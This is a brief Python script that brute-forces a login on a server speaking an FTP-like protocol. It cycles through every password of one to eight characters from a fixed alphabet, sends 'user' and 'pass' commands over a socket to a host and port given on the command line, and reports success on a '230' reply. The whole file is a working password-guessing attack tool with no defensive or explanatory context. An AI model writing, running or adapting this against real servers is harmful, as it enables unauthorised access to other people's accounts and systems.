#!/usr/bin/python

import os
import sys
import socket
import itertools

def connect(username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((sys.argv[1], int(sys.argv[2])))
    data = s.recv(1024)

    s.send('user '     + username    + '\n')
    data = s.recv(1024)

    s.send('pass ' + password + '\n')
    data = s.recv(3)

    s.send('quit\n')
    s.close

    return data

username = sys.argv[3]

for r in [1,2,3,4,5,6,7,8]:
    comb = itertools.product('abcdefghiklmnopqrstuwyz0123456789', repeat=r)

    for x in comb:
        password=''.join(x)
        attempt = connect(username, password)
        
        if attempt == '230':
            print('password found: ' + password)
            sys.exit(0)
        else:
            sys.stdout.write(password+'\r')
            sys.stdout.flush()

print('password not found')
sys.exit(1)
